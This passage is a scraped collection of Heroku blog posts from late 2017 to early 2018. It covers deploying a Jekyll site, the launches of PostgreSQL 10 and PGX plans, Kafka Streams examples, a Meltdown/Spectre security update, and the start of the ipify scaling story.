for free similar to starting a new Rails app. We’ll be saving our work in Git along the way: $ jekyll new jekyll-on-heroku\nIgnoring nokogiri-1.8.1 because its extensions are not built.  Try: gem pristine nokogiri --version 1.8.1\nRunning bundle install in /Users/caleb.thompson/code/jekyll-on-heroku/_rundoc/tmp/jekyll-on-heroku...\n  …\nNew jekyll site installed in /Users/caleb.thompson/code/jekyll-on-heroku/_rundoc/tmp/jekyll-on-heroku.\n$ cd jekyll-on-heroku\n$ git init\nInitialized empty Git repository in /Users/caleb.thompson/code/jekyll-on-heroku/_rundoc/tmp/jekyll-on-heroku/.git/\n$ git add .\n$ git commit -m \"jekyll new jekyll-on-heroku\"\n[master (root-commit) ea8cd80] jekyll new jekyll-on-heroku\n 8 files changed, 206 insertions(+)\n create mode 100644 .gitignore\n create mode 100644 404.html\n create mode 100644 Gemfile\n create mode 100644 Gemfile.lock\n create mode 100644 _config.yml\n create mode 100644 _posts/2017-12-07-welcome-to-jekyll.markdown\n create mode 100644 about.md\n create mode 100644 index.md We have our Jekyll site (go ahead and try jekyll serve if you’d like), but we’ll need a Heroku app to deploy to. You will need an account and the CLI installed before this step. We’re going to use the official Ruby buildpack as well as Heroku’s (unofficial) Static buildpack to do the site generation and static page serving, respectively: $ heroku create\nCreating app... done, radiant-bastion-50307\nhttps://radiant-bastion-50307.herokuapp.com/ | https://git.heroku.com/radiant-bastion-50307.git\n$ heroku buildpacks:add heroku/ruby\nBuildpack added. Next release on radiant-bastion-50307 will use heroku/ruby.\nRun git push heroku master to create a new release using this buildpack.\n$ heroku buildpacks:add https://github.com/heroku/heroku-buildpack-static\nBuildpack added. Next release on radiant-bastion-50307 will use:\n  1. heroku/ruby\n  2. https://github.com/heroku/heroku-buildpack-static\nRun git push heroku master to create a new release using these buildpacks. Heroku’s buildpacks need specific files to be present to work correctly. We already have Gemfile for the Ruby buildpack, but we’ll also need a static.json file for the static buildpack. I’ve added a few of my favorite options to the static.json , and we’ll need to use _site/ for our root as that is where Jekyll builds its static content by default. In file static.json write: {\n  \"clean_urls\": true,\n  \"https_only\": true,\n  \"root\": \"_site/\"\n} Let’s save our progress again. $ git add static.json\n$ git commit -m \"Add static.json with reasonable defaults\"\n[master 6e1dea7] Add static.json with reasonable defaults\n 1 file changed, 5 insertions(+)\n create mode 100644 static.json The Ruby buildpack runs rake assets:precompile when it’s available. This is inspired by Rails’ pattern, but it works for any assets you’ll need. We’re going to use it for our entire site by running jekyll build . In file Rakefile write: task \"assets:precompile\" do\n  exec(\"jekyll build\")\nend You’ll need Rake to run this in the first place, and we can save ourselves trouble in the future by specifying a version. At the end of Gemfile add: gem \"rake\"\nruby \"2.4.2\" And run bundle to install Rake. $ bundle\n  …\nBundle complete! 5 Gemfile dependencies, 24 gems now installed.\nUse `bundle info [gemname]` to see where a bundled gem is installed. We need to add the changes for the Rake task and new dependencies: $ git add Rakefile Gemfile Gemfile.lock\n$ git commit -m \"Add Rake task to build Jekyll site\"\n[master 94f664b] Add Rake task to build Jekyll site\n 3 files changed, 10 insertions(+)\n create mode 100644 Rakefile Finally, we can push the app to Heroku! $ git push heroku master\nwarning: not sending a push certificate since the receiving end does not support --signed push\nremote: Compressing source files... done.\nremote: Building source:\nremote:\nremote: -----> Ruby app detected\nremote: -----> Compiling Ruby\nremote: -----> Using Ruby version: ruby-2.4.2\nremote: -----> Installing dependencies using bundler 1.15.2\nremote:        Running: bundle install --without development:test --path vendor/bundle --binstubs vendor/bundle/bin -j4 --deployment\n  …\nremote: -----> Detecting rake tasks\nremote: -----> Precompiling assets\nremote:        Running: rake assets:precompile\nremote:        Configuration file: /tmp/build_c29844d07a39f5ce14fd64c34fc17680/_config.yml\nremote:        Source: /tmp/build_c29844d07a39f5ce14fd64c34fc17680\nremote:        Destination: /tmp/build_c29844d07a39f5ce14fd64c34fc17680/_site\nremote:        Incremental build: disabled. Enable with --incremental\nremote:        Generating...\nremote:        done in 0.901 seconds.\nremote:        Auto-regeneration: disabled. Use --watch to enable.\nremote:        Asset precompilation completed (1.49s)\nremote:\nremote: ###### WARNING:\nremote:        No Procfile detected, using the default web server.\nremote:        We recommend explicitly declaring how to boot your server process via a Procfile.\nremote:        https://devcenter.heroku.com/articles/ruby-default-web-server\nremote:\nremote: -----> Static HTML app detected\nremote:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\nremote: 100  838k  100  838k    0     0  5598k      0 --:--:-- --:--:-- --:--:-- 5628k\nremote: -----> Installed directory to /app/bin\nremote: -----> Discovering process types\nremote:        Procfile declares types     -> (none)\nremote:        Default types for buildpack -> web\nremote:\nremote: -----> Compressing...\nremote:        Done: 26.4M\nremote: -----> Launching...\nremote:        Released v3\nremote:        https://radiant-bastion-50307.herokuapp.com/ deployed to Heroku\nremote:\nremote: Verifying deploy... done.\nTo https://git.heroku.com/radiant-bastion-50307.git\n * [new branch]      master -> master Open the URL at the end and enjoy your new Jekyll app on Heroku! jekyll blog ruby static site", "date": "2017-12-13,"},
{"website": "Heroku", "title": "PostgreSQL 10 Generally Available on Heroku", "author": ["Camille Baldock"], "link": "https://blog.heroku.com/postgresql-10-general-availability", "abstract": "PostgreSQL 10 Generally Available on Heroku Posted by Camille Baldock December 14, 2017 Listen to this article Today, we're happy to announce full support for PostgreSQL 10, opening our managed Postgres solution to the full slate of features released after a successful two-month Beta period . PostgreSQL 10 is now the default version for all new provisioned Heroku Postgres databases. All Postgres extensions, tooling, and integration with the Heroku developer experience are ready to use, giving you the power of PostgreSQL 10 with the ease and usability of Heroku for building data-centric applications. We'd like to re-emphasize a few features - among the many released in Postgres 10 - that we are particularly excited about. Native Table Partitioning A pattern we often see in databases in our fleet is one or two tables growing at a rate that’s much larger and faster than the rest of the tables in the database. Query times within the application will start to rise, bulk loads will take longer, and creating indexes can take a long time. Postgres table partitioning can be a great way to keep good query performance for those very large tables by partitioning what is logically one big table into smaller physical pieces. In PostgreSQL 10, users have the option to leverage native table partitioning — our Postgres 10 beta blog post provides an example on how to use native table partitioning. The pg_partman extension is still supported for those wishing to continue using it for time-based and serial-based table partition sets. Increased Parallelism for Performance Improvements Additionally, a lot of work in PostgreSQL 10 has been put in to improving use of parallelism for joins, scans and queries. This enables PostgreSQL to take advantage of the multiple CPU cores available on our production plans. Users will see a performance boost for some queries, particularly more complex ones. Get Started Today If you want to try out the new version, it's is as simple as provisioning a new database: $ heroku addons:create heroku-postgresql -a sushi\n\n$ heroku pg:info DATABASE_URL -a sushi\n=== DATABASE_URL\nPlan:                  Hobby-dev\nStatus:                Available\n...\nPG Version:            10.1\n... If you have an existing database on the platform, we encourage you to look into upgrading your Postgres version: see our documentation for upgrading . For further details about other new features in PostgreSQL 10, please see the PostgreSQL documentation . Let us know what you think at postgres@heroku.com . postgres sql database", "date": "2017-12-14,"},
{"website": "Heroku", "title": "Kafka Streams on Heroku", "author": ["Jeff Chao"], "link": "https://blog.heroku.com/kafka-streams-on-heroku", "abstract": "Kafka Streams on Heroku Posted by Jeff Chao December 19, 2017 Listen to this article Designing scalable, fault tolerant, and maintainable stream processing systems is not trivial. The Kafka Streams Java library paired with an Apache Kafka cluster simplifies the amount and complexity of the code you have to write for your stream processing system. Unlike other stream processing systems, Kafka Streams frees you from having to worry about building and maintaining separate infrastructural dependencies alongside your Kafka clusters. However, you still need to worry about provisioning, orchestrating, and monitoring infrastructure for your Kafka Streams applications. Heroku makes it easy for you to deploy, run, and scale your Kafka Streams applications by using supported buildpacks from a variety of Java implementations and by offering a fully-managed Kafka solution for handling event streams. That way, you can leverage the Heroku Runtime alongside Apache Kafka on Heroku to manage your Kafka Streams applications so you can focus on building them. Kafka Streams is supported on Heroku with both basic and dedicated managed Kafka plans. Let's take a closer look into how this all works by stepping through an example Kafka Streams application on Heroku. You can try out the open source example as you follow along here. A Kafka Streams Application First, let's explain a few concepts. A stream is an unbounded, replayable, ordered, and fault-tolerant sequence of events. Kafka Streams is a library which simplifies producing and consuming events in a stream. By default, this library ensures that your application handles stream events one at a time, while also providing the ability to handle late-arriving or out-of-ordered events. Applications using Kafka Streams are deployed as normal Java services and communicate directly with Kafka clusters. The diagram below illustrates a high-level overview of a Kafka Streams application. This application contains two example use cases: a streaming Word Counter and an Anomaly Detector. The Word Counter is composed by two separate Kafka Streams services, a Text Processor and an Aggregator, which are interconnected by the words Kafka topic. This shows that you can build multiple smaller services to construct a single larger use case by connecting them through Kafka topics. The Anomaly Detector is composed by a single Kafka Streams service and has no relationship to the Word Counter. This shows that services don't necessarily have to be connected to each other. More detail about how you can get this set up and running on Heroku is discussed later in this post. In the meantime, let's look at what each service is doing. Text Processor The Text Processor is a Kafka Streams service that implements the traditional use case of maintaining a streaming word count. Below is a code snippet: final KStream<String, String> textLines =\n    builder.stream(String.format(\"%stextlines\", HEROKU_KAFKA_PREFIX));\n\nfinal Pattern pattern = Pattern.compile(\"\\\\W+\", Pattern.UNICODE_CHARACTER_CLASS);\n\ntextLines\n    .flatMapValues(value -> Arrays.asList(pattern.split(value.toLowerCase())))\n    .to(String.format(\"%swords\", HEROKU_KAFKA_PREFIX), Produced.with(Serdes.String(), Serdes.String())); In just a few lines of code, this consumes strings from the textlines topic, splits up each sentence into words, and sinks each word into the words topic. The purpose of this is to serve as a pre-processor where it sanitizes input for downstream processors. Aggregator The Aggregator is a Kafka Streams service that counts words within a window and emits results to an external system. This is downstream of the Text Processor service through the words topic. Here's a code snippet: final KStream<Windowed<String>, String> words =\n    builder.stream(String.format(\"%swords\", HEROKU_KAFKA_PREFIX));\n\nwords\n    .groupBy((key, word) -> word)\n    .windowedBy(TimeWindows.of(TimeUnit.SECONDS.toMillis(10)))\n    .count(Materialized.as(\"windowed-counts\"))\n    .toStream()\n    .process(PostgresSink::new); This consumes words represented as strings from the words topic, groups words together, counts each group of words over a 10 second window, and sends results over to a sink processor. This processor writes data to an external Postgres database. Note that writing to external systems is an extremely hard problem to get right. Although you would normally use connectors provided by Kafka Connect for these types of operations, this example illustrates that you can write your own sink processors. This functionality is useful in the case where a connector doesn't yet exist in the ecosystem. Anomaly Detector The Anomaly Detector is an independent service that detects and alerts on categories of unexpected behavior within time windows for a web application. The code snippet is as follows: final KStream<String, String> loglines =\n    builder.stream( String.format(\"%sloglines\", HEROKU_KAFKA_PREFIX));\n\nKStream<Windowed<String>, Long> anomalies = loglines\n    .filter((key, value) -> value.contains(\"login failed\"))\n    .selectKey((key, value) -> value.split(\"\\\\|\")[0])\n    .groupByKey()\n    .windowedBy(TimeWindows.of(TimeUnit.SECONDS.toMillis(10)))\n    .count(Materialized.as(\"windowed-counts\"))\n    .toStream();\n\n@SuppressWarnings(\"unchecked\")\nKStream<Windowed<String>, Long>[] branches = anomalies\n    .branch(\n        (key, value) -> value > 100,\n        (key, value) -> value > 50\n    );\n\nbranches[0].process(AlertSink::new);\nbranches[1].process(EmailSink::new); This consumes web application log lines represented as strings from the loglines topic. It then naively filters each line for unexpected behavior and extracts the user id into a new key. Next, it groups each log line by keys over a 10 second window. From there, if the behavior hits a critical threshold, it will send an urgent alert, otherwise if it hits a lower threshold, it will send a non-urgent email. Note the code snippet above contains filter followed by selectKey which may generally be replaced with a single groupBy . Now that you have your services written and have an understanding of the theory behind them, let's see how this all works in practice by first looking at how you would organize your application and then, how you would vertically and horizontally scale your application. Organizing Your Application An easy approach to organizing your application is to use Gradle. Using a multi-project setup with Gradle, you can create multiple Gradle sub-projects that each represent a different Kafka Streams service. These services can operate independently or be interconnected. Heroku will automatically detect the presence of a gradlew script, classify your application as a Gradle-based project, and add the Gradle buildpack. This multi-project setup makes it easy for you to logically group different smaller services into a single larger use case. Using this setup, you can get your application running on Heroku with minimal setup: Define your Gradle sub-projects. Add them to the Procfile . Deploy your application to Heroku. Defining Sub-projects To define sub-projects: Create a directory with your sub-project name, e.g., streams-anomaly-detector . In the settings.gradle file in your application's root directory, include the sub-project's directory name. rootProject.name = 'kafka-streams-on-heroku'\n\ninclude 'streams-text-processor'\ninclude 'streams-anomaly-detector'\ninclude 'streams-aggregator' You should then include a build.gradle in your sub-project's directory. Each sub-project has their own build.gradle file for managing dependencies. However, they can inherit common dependencies from the build.gradle in the application's root directory. Each sub-project will create a single executable by leveraging the Gradle application and shadowJar plugins. These executables are created in your application's build/libs directory. The gradle/heroku/stage.gradle file ensures that this happens automatically every time you deploy your application to Heroku: task stage(dependsOn: ['clean', 'shadowJar'])\n\ntask copyToLib(type: Copy) {\n  from \"$buildDir/libs\"\n  into \"$rootProject.buildDir/libs\"\n}\ncopyToLib.dependsOn(shadowJar)\nstage.dependsOn(copyToLib) Adding to Your Procfile Now that you know where your executables are placed, you can modify the Procfile to specify how they are run: text_processor_worker: java -jar build/libs/streams-text-processor-all.jar\nanomaly_detector_worker: java -jar build/libs/streams-anomaly-detector-all.jar\naggregator_worker: java -jar build/libs/streams-aggregator-all.jar You can now leverage Heroku's build and deploy pipeline and work with a convenient and familiar workflow for getting your application running in a production environment: $ git push heroku master Now that your application is running on Heroku, let's look at how you would vertically and horizontally scale your application. Scaling Your Application To better understand how your Kafka Streams application can scale on Heroku, let's take a look at: Kafka's parallelism model. Kafka Streams's parallelism model. How both of these models apply to Heroku. In Kafka, partitions are a Kafka topic's fundamental unit of parallelism. The number of partitions in a topic represents the topic's upper bound for parallelism. In Kafka Streams, Stream Tasks are a Kafka Streams service's fundamental unit of parallelism. Stream Tasks can interact with one or more partitions. Because of this, partitions also represent the upper bound for parallelism of a Kafka Streams service where the number of Stream Tasks must be less than or equal to the number of partitions. Kafka Streams uses an application.id to transparently ensure that partitions are spread evenly across Stream Tasks. The application.id identifies your Kafka Streams service and is unique per Kafka cluster. You can set your application.id when creating your KafkaStreams instance: Properties streamsConfig = new Properties();\n\nproperties.put(\n    StreamsConfig.APPLICATION_ID_CONFIG,\n    String.format(\"%sanomaly-detector-app\", HEROKU_KAFKA_PREFIX));\n\nfinal KafkaStreams streams = new KafkaStreams(builder.build(), streamsConfig); The following diagram illustrates how Kafka Streams services on Heroku are managed: The Heroku Runtime contains many applications, some of which may be Kafka Streams applications running multiple services. These services have one or more instances. Each instance runs within a dyno. Within each instance are one or more Stream Threads and within each Stream Thread, one or more Stream Tasks. Kafka Streams has capabilities that make scaling your applications manageable. Combined with Heroku, Kafka Streams makes scaling your application easy. Vertical Scaling In order to vertically scale your Kafka Streams application, you increase or decrease the number of Stream Threads in each instance for your services: You can do this by adding in a config when creating your KafkaStreams instance: properties.put(StreamsConfig.NUM_STREAM_THREADS_CONFIG, 2); After this, all you have to do is redeploy to Heroku: $ git push heroku master Once your dynos are restarted, Kafka Streams will automatically redistribute Stream Tasks among available Stream Threads. Horizontal Scaling If you recall from the example application, there's a Procfile which contains three different Kafka Streams services, effectively three separate Java workers: text_processor_worker: java -jar build/libs/streams-text-processor-all.jar\nanomaly_detector_worker: java -jar build/libs/streams-anomaly-detector-all.jar\naggregator_worker: java -jar build/libs/streams-aggregator-all.jar Even though they may communicate through a Kafka topic, each of these services run independently of each other in their own dynos. This allows you to effectively scale each service independently by scaling its dyno count, for example: $ heroku ps:scale anomaly_detector_worker=2 —app sushi This will increase the number of anomaly detector dynos to two. From there, Kafka Streams will automatically redistribute Stream Tasks among running anomaly detector workers. If a worker goes down, Heroku will restart it on another dyno and Kafka Streams will rebalance partitions among Stream Tasks. Bringing It All Together Kafka Streams is a library that makes it easy for developers to build stream processing applications. Paired with Heroku, it's even better. Developers can build their Kafka Streams applications on Heroku and leverage all of Heroku's existing tooling and infrastructure to make deploying, running, and scaling their stream processing applications easier than ever before. For more information about running Kafka Streams on Heroku, visit the Dev Center article and open source example on Github . java kafka streams microservices data events stream processing", "date": "2017-12-19,"},
{"website": "Heroku", "title": "Meltdown and Spectre Security Update", "author": ["Trey Ford"], "link": "https://blog.heroku.com/meltdown-and-spectre-security-update", "abstract": "Meltdown and Spectre Security Update Posted by Trey Ford January 04, 2018 Listen to this article UPDATE: Friday, January 5 19:07 PST As of 13:30 PST, AWS completed their patch deployment addressing tenant isolation threats. AWS reports they have restored the expected multi-tenancy protections similar to dedicated hardware, which leaves Heroku to address the kernel vulnerabilities in runtime host operating systems. Heroku Performance, Private, and Shield dynos feature varying degrees of isolation from potentially hostile neighbors. However, the shared Common Runtime carries our highest priority for Meltdown (variant 3) mitigation work due to the nature of its shared infrastructure. The ideal fix is to deploy the updated kernel from Canonical prior to the release of functional proof-of-concept exploit code for this vulnerability. As this patch is not yet available, the Heroku Security team has opted for a more rapid response. Over the last 24 hours, Heroku Engineering has prepared our own upstream kernel deployment as an aggressive measure to protect the shared Common Runtime. We began deploying this update as soon as possible, beginning on Friday morning. Heroku has now fully deployed this update to the US and EU shared Common Runtime, which will be replaced when the official Canonical update is made available. On January 3, researchers disclosed a security vulnerability affecting side-channel analysis of speculative execution on modern computer processors (CVE-2017-5715, CVE-2017-5753, and CVE-2017-5754). Heroku’s Product Security team follows emerging trends, and partners closely with the research community. We invest heavily in facilitating conversations regarding vulnerabilities and keeping our customers safe via community partnerships. In the case of emerging and recently-announced vulnerabilities (including those embargoed or leaked to the press), we have a proven methodology for ingesting, processing, and prioritizing mitigation work. Our team utilizes these methods to address these vulnerabilities as material or actionable information is made available. Our Security and Platform teams are working closely with AWS and Canonical (makers of the Ubuntu Linux operating system) to investigate and patch any affected systems related to the Meltdown and Spectre announcements.  If customer impact or coordination is required, we will post additional information via Heroku Status , DevCenter ChangeLog , or provide instructions and context via maintenance notification emails. security", "date": "2018-01-04,"},
{"website": "Heroku", "title": "Announcing the New Heroku Partner Portal for Add-ons", "author": ["Nahid Samsami"], "link": "https://blog.heroku.com/announcing-the-new-partner-portal-for-add-ons", "abstract": "Announcing the New Heroku Partner Portal for Add-ons Posted by Nahid Samsami January 11, 2018 Listen to this article We are excited to announce that the new Heroku Partner Portal for Add-ons is now generally available. The new portal offers an improved partner experience for building, managing, and updating Heroku add-ons. Our goal is to create a workflow that will give you more freedom and enable you to bring your add-ons to market more easily. The new portal has been organized into a simple, elegant interface that is similar to the rest of Heroku's products. In each section, we've made more functionality available via the portal interface, where in the past emails or support tickets might have been necessary.  This release brings a more visual approach as well as greater focus to creating and managing key aspects of your add-on offerings such as Marketplace Listing, Feature Plans, and Reports. Marketplace Listing The marketplace listing section of the portal is where you create or edit content for your add-on’s listing in the Elements Marketplace , where customers learn about your add-on offering. We've organized all the marketplace content into one tab of the partner portal for easier editing. We've also made it easier to re-order the paragraphs describing your add-on's benefits with a drag and drop interface. Coming soon: the ability to update your add-on's screenshots through the interface. Features and Plans We've simplified and made it easier for you to manage your add-on plans. We have categorized the different types of plans based on their availability to customers and you can view each type of plan in a different tab. The default view shows all plans. Reports You can view and download your company's revenue reports from this section, in either PDF or CSV format. You can also view a chart of revenue by plan over time. Get Started If you're interested in becoming an add-on partner, you can learn more about the Heroku Ecosystem Partner Program . If you're already an add-on partner, login and get started with the new portal. Thank you to all our partners for making the Heroku Elements Marketplace a success! Please send feedback and suggestions to ecosystem-feedback@heroku.com . partners addons partner portal", "date": "2018-01-11,"},
{"website": "Heroku", "title": "The 2017 Heroku Retrospective: Advancing Developer Experience, Data, and Trust", "author": ["Matt Schaar"], "link": "https://blog.heroku.com/2017-heroku-retrospective", "abstract": "The 2017 Heroku Retrospective: Advancing Developer Experience, Data, and Trust Posted by Matt Schaar January 12, 2018 Listen to this article 2017 was a great year for Heroku and our users. We want to thank each of you for your feedback, beta participation, and spirit of innovation, which inspires how we think about our products and evolve the platform. In the past year, we released a range of new features to make the developer experience even more elegant. We bolstered our existing lineup of data services while providing security controls for building high compliance applications on the platform. With that, we’d like to take a moment and share some of the highlights from 2017. We hope you enjoy it, and we look forward to an even more exciting 2018! Advancing the Developer Experience Heroku CI Run tests with zero queue time on every push to GitHub using a low-setup visual test runner that’s integrated with Heroku Pipelines for strong dev/prod parity. Free and Automated SSL Certs Heroku Automated Certificate Management handles all aspects of SSL/TLS certificates for custom domains. This makes creating secure web applications easier than ever. Heroku Autoscaling Check out how response-based Autoscaling ensures that your app users always have a good experience. The Heroku-16 Stack Heroku-16 includes updated stack libraries, a smoother Docker development experience, and improved compilation for Ruby and Python packages. Container Registry & Runtime Create your own stack with your choice of base operating system and install any dependency. Take advantage of Docker's local development experience for dev/prod parity. Heroku ChatOps for Slack Heroku ChatOps uses the power of Heroku Pipelines to bring a collaborative deployment workflow to Slack. Deploy code, promote code, and keep track of your CI test status—all from your Slack channel. Einstein Vision Add-on Learn how to embed custom image classification into your apps with a new Heroku Add-on. Release Phase Push your code and have Release Phase automatically run tasks that your app needs for production, such as a database schema migration, uploading static assets to a CDN, or invalidating a cache. Heroku Exec & Language Runtime Metrics Use JVM Language Metrics to identify potential issues early by viewing indicators like garbage collection activity and heap memory usage, then SSH into a running dyno with Heroku Exec for further inspection. Heroku Webhooks Integrate Heroku into custom workflows and third-party tools. Get notifications of changes to your domain settings, releases, add-ons, and dyno formations. More Ways to Build Data-Centric Apps on Heroku PostgreSQL 10 Generally Available on Heroku The power of PostgreSQL 10—increased parallelism for performance, native table partitioning, and more—is now generally available on Heroku Postgres. New Plans and Pricing for Apache Kafka on Heroku Building event-driven architectures is now easier and more accessible with new managed Kafka plans and pricing for development, testing, and low-volume production needs. Heroku Postgres Update - Configuration, Credentials, and CI Customize Heroku Postgres to meet your team’s needs. Configure database settings, manage user permissions with credentials, and auto-provision Postgres for Heroku CI. Heroku Connect Update - Fast Writes, Global Deployment, & Guided Management The latest release of Heroku Connect lets you sync customer data with Salesforce on average 5x faster, deploy closer to customers in 6 global regions, and be more productive. Extending Trust: Security Controls & Scale for Large Organizations Heroku Shield Heroku Shield introduces new flavors of Dynos, Postgres databases, and Private Spaces that make Heroku suitable for running apps with higher accountability and compliance requirements, such as HIPAA. PCI Compliance for Heroku Shield Build critical apps with the agility of the Heroku developer experience on a PCI-compliant platform with Heroku Shield. Heroku Private Space Peering for AWS Connect your Heroku apps securely and privately to AWS services, such as EC2, RDS, Redshift, and more, to build a new class of multi-cloud architectures. DNS Service Discovery We’ve made it easier to build microservice architectures with the introduction of Service Discovery, a simple way to find other services using a standard DNS naming scheme. Dublin Region for Private Spaces Deploy apps closer to your customers in Europe using a network-isolated, dedicated runtime environment with your own private network and data services. Log in today, give the new features a try, and let us know what you think. And as an added treat, you can download your Heroku artwork here . heroku", "date": "2018-01-12,"},
{"website": "Heroku", "title": "Heroku Postgres PGX: Bigger Databases, Improved Infrastructure, Same Price", "author": ["Camille Baldock"], "link": "https://blog.heroku.com/heroku-pgx-plans", "abstract": "Heroku Postgres PGX: Bigger Databases, Improved Infrastructure, Same Price Posted by Camille Baldock January 17, 2018 Listen to this article Today, we’re excited to announce a major update to Heroku Postgres with a new lineup of production plans. These plans are the first component of Heroku Postgres PGX, the next generation of our managed Postgres solution. PGX Plans introduce larger database sizes, more generous resource allocations, and a broader set of options to suit your needs and to help your applications scale more smoothly. PGX Plans are generally available as of today, and all new Postgres databases will be created on our latest generation of Postgres infrastructure. Underneath the hood, we've upgraded the CPU, memory, storage, and networking aspects to ensure your Postgres database is running smoothly at scale. To take a look at which of your Heroku Postgres databases can take advantage of PGX Plans now and how, go to data.heroku.com . New Production Plans for More Flexible Scaling Our new lineup of 8 plan levels offers gradual transitions to help you grow from a small production database on our level 0 plans all the way to large amounts of data with demanding workflows with our level 8 plans. These new plans are available for Production-ready Postgres with our Standard tier, critical applications with our Premium tier, as well as with our Private Spaces-compatible Private and Shield tiers. Plan levels * RAM Provisioned I/O per second Disk size 0 4 GB 200 68 GB 2 8 GB 200 256 GB 3 15 GB 1000 512 GB 4 30 GB 2000 768 GB 5 61 GB 4000 1 TB 6 122 GB 6000 1.5 TB 7 244 GB 9000 2 TB 8 488 GB 12000 3 TB * Applies to Standard, Premium, Private tiers You can learn more about the technical specifications of each plan - and what would best suit your needs - on our list of Heroku Postgres plans and our Dev Center article on choosing the right Heroku Postgres plan. More Storage at the Same Price As their applications increase in complexity and require more data, customers have been looking for expanded storage to handle larger volumes of data. PGX Plans introduce additional storage, at plan level 4 and above, that expands available disk by at least 1.5 times the existing amount - also at no additional cost. With this storage expansion, PGX Plans now enable you to install a Postgres database with up to 3 Terabytes of storage. For our customers who use Postgres for analytically-focused workloads with critical storage, these new plans will enable nearly-limitless large-scale querying. Improved Infrastructure at the Same Price Customers with demanding production applications have asked us for improved infrastructure that can better support them as their applications become more complex and mission-critical. PGX Plans update our existing slate of managed Postgres plans with substantial changes to our hardware and networking at no additional cost. Our approach to improved infrastructure for Postgres comes in two forms: Previously, variable loads on level 2 plans (standard-2, premium-2 and private-2) occasionally reached burstable capacity limits. PGX level 2 production plans are provisioned for consistently higher loads, providing you with predictable and consistent performance. For level 4 plans and above (levels 4, 6 and 7), PGX Plans rely on infrastructure that has significant improvements to its memory, I/O, and networking performance. As an example, let's look at an existing standard-4 Postgres plan. In comparison, A PGX standard-4 plan provides twice the memory, I/O and RAM as its predecessor. RAM IOPS vCPUs Existing standard-4 15 GB 1000 2 PGX standard-4 30 GB 2000 4 Migrating Your Existing Database to PGX Plans If your database is on a standard-2, premium-2 or private-2 plan, we've already updated your database to updated PGX Plans infrastructure. If you're on a level 4 or above plan, there are a few simple steps you'll need to do to upgrade: Go to data.heroku.com . If your database is eligible for an upgrade, you'll receive a notification guiding you to the Dev Center article outlining your upgrade instructions. Or, run 'pg:info' in your CLI to determine if your database is eligible. heroku pg:info -a sushi\n=== HEROKU_POSTGRESQL_RED\nPlan         Standard 4\nStatus       available\n…\nImproved Standard-4 Plans Available at the same price (2x RAM, 2x vCPU, 2x IOPS)\nLearn More: https://blog.heroku.com/new-heroku-postgres-plans\nUpdate Now: https://devcenter.heroku.com/articles/updating-heroku-postgres-databases Instructions on how to update your database are available in our Dev Center . More to Come: Updates, Features, and Maintenances This is the first of many steps in PGX we'll share with you this year - stay tuned for continued updates on new features and maintenance plans to get the most out of your Heroku Postgres experience. We hope you all enjoy your new PGX Plans - If you have any feedback or questions, please get in touch ! heroku postgres pgx", "date": "2018-01-17,"},
{"website": "Heroku", "title": "Scaling ipify to 30 Billion Requests and Beyond on Heroku", "author": ["Randall Degges"], "link": "https://blog.heroku.com/scaling-ipify-to-30-billion-and-beyond", "abstract": "Scaling ipify to 30 Billion Requests and Beyond on Heroku Posted by Randall Degges January 23, 2018 Listen to this article The following is the story of how Randall Degges created a simple API to solve the common problem of external IP address lookup and how he scaled it from zero to over 10 thousand requests per second (30B/month!) using Node.js and Go on Heroku. Several years ago I created a free web service, ipify . It is a highly scalable IP address lookup service. When you make a GET request against it, it returns your public-facing IP address. Try it out yourself! I created ipify because, at the time, I was building complex infrastructure management software and needed to dynamically discover the public IP address of some cloud instances without using any management APIs. When I searched online for freely available reverse IP lookup services I didn’t find any suitable solutions: There were websites I could attempt to scrape my IP from (but this is bad form, and would likely result in complaints from the host) There were APIs for this that charged money (which seemed unreasonable for such a simple service) There were APIs that allowed you to do a limited number of lookups per day (which scared me as I was managing a lot of instances at the time) There were APIs that appeared to be what I wanted, but upon using them they’d error out, go down randomly, or just otherwise not be of high quality. When I inspected the dig records of a particular provider, I noticed that the entire service was running on a single server (with an A record) that was terminating requests directly: not the most scalable/highly available service in the world. There was an API service that looked somewhat OK but was trying to raise money via donations to stay alive. Integrating with an API service on the brink of death didn’t make me feel terribly comfortable. Because of all these reasons I figured I’d just throw a small service together myself and solve the problem for as many people as possible. After all, writing software to return a single string isn’t terribly hard. Why shouldn’t I do it? I assumed that worst case I’d spend $30 bucks or so per month and treat it as a public service. ipify v0 The first iteration of ipify was quite simple. I wrote an extremely tiny (< 50 LOC) API service in Node. Since the entire premise of the ipify service is returning a string, I figured this was a perfect use case for Node as a technology: handling a lot of simple requests with minimal CPU usage. After I had the API service built in Node, I threw together a simple static site to power the front-end and deployed it into an S3 bucket on Amazon. I then configured a CloudFront origin (Amazon’s CDN service) to sit in front of the S3 bucket and cache the pages for ultra-fast load times. Now, I’m not a designer by any stretch of the imagination… But, with a little bootstrap love things turned out half-decent. Now, I needed to deploy it. Enter Heroku I’m a big fan of Heroku (I’ve even written a book about it). I’ve been using it for many years now and consider it to be one of the most effective services in the developer world. I decided that if I wanted to run ipify in a scalable, highly available and cheap way then Heroku was the simplest and best option. So that’s what I went with. I deployed ipify to Heroku in a minute or two, ran it on a single dyno , and did some limited testing. Things again seemed to be working well and I was feeling pretty happy with myself. If you aren’t familiar with Heroku, let me explain how ipify’s infrastructure was working: Heroku ran my ipify web service on a small dyno with 512M RAM and limited CPU If my process crashed or had any critical issues, Heroku would automatically restart it for me Heroku ran a load balancer that accepted all incoming requests for my app and forwarded them to my dyno to process the request This is a nice setup because: Everything is highly available: Heroku’s load balancers, my dyno, everything It requires no maintenance, configuration management, or any sort of deployment code. It’s 100% automated. It’s cheap: I paid ~$7/mo to run this single web server It’s fast: Heroku runs on top of Amazon Web Services (AWS), so my infrastructure was running in one of the most popular cloud hosted destinations in the world: AWS. At this point, I was feeling pretty good. This took less than 1 day’s worth of work to build, setup, test, and move into production. I then integrated ipify into my own infrastructure management code to solve the problem I had initially needed to resolve. Things were going great for about a month before I started noticing some issues… Popularity... Ugh I never marketed ipify, but it ended up ranking really high for the “ip address api” search phrase on Google, and still does. I guess all those years working on copy editing and SEO paid off. Within a month or so, ipify was ranking near the top of Google search results, bringing in thousands of new users. With the increased visibility of the service, I started seeing some issues. The Heroku load balancer was firing off warnings because my Node server wasn’t servicing incoming requests quickly enough. What ended up happening was: Too many users would make API requests to ipify My Node server would start responding to requests slowly so latency would rise The Heroku load balancer would notice this and start buffering requests before sending them onto my Node server Because my Node server wasn’t servicing requests quickly enough, the load balancer would return a 503 to the user and the request would die off Not a pretty picture. So what I did was simple: I added another Heroku dyno. This way, I’d have twice the capacity and things would run smoothly again. The downside is that scaling to two “production” dynos on Heroku increased my cost to 